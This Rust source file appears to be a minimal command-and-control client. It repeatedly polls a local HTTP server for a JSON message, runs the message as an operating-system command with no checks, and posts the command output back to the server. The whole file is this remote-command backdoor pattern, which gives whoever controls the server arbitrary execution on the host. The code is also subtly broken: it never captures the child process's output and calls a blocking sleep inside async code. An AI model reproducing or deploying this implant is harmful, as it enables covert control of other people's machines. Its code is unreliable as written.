use std::io::Read;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

use reqwest::Client;
use serde_json::Value;

#[tokio::main]
async fn main() {
	println!("Client");
	let client = &Client::new();
	loop {
		sleep(Duration::from_secs(1));
		let _ = recv_command(client).await;
	}
}

async fn recv_command(client: &Client) {
	let res = match reqwest::get("http://127.0.0.1:8080/recv").await {
		Ok(res) => res,
		Err(_) => return,
	};

	if res.status() != 200 {
		return;
	}
	let body = match res.text().await {
		Ok(body) => {
			body
		}
		Err(_) => return,
	};

	let body = match parse_msg(&body) {
		Some(body) => body,
		None => return,
	};

	let mut parts = body.split_whitespace();
	let cmd = match parts.next() {
		Some(cmd) => cmd,
		None => return,
	};
	let child = match Command::new(cmd).args(parts).spawn() {
		Ok(child) => child,
		Err(e) => {
			dbg!(e);
			return;
		}
	};

	if let Some(mut stdout) = child.stdout {
		let mut output = Vec::new();
		if stdout.read_to_end(&mut output).is_ok() {
			let _ = send_stdout(String::from_utf8_lossy(&output).to_string(), client).await;
		}
	}
}


fn parse_msg(json: &str) -> Option<String> {
	let data = match serde_json::from_str::<Value>(json) {
		Ok(data) => data,
		Err(_) => return None,
	};

	let data_object = data.get("data")?;
	let message = data_object.get("message")?;
	let message_str = message.as_str()?;
	Some(message_str.to_string())
}

async fn send_stdout(output: String, client: &Client) {
	let _ = client.post("http://127.0.0.1:8080/sendhost").body(output).send().await;
}
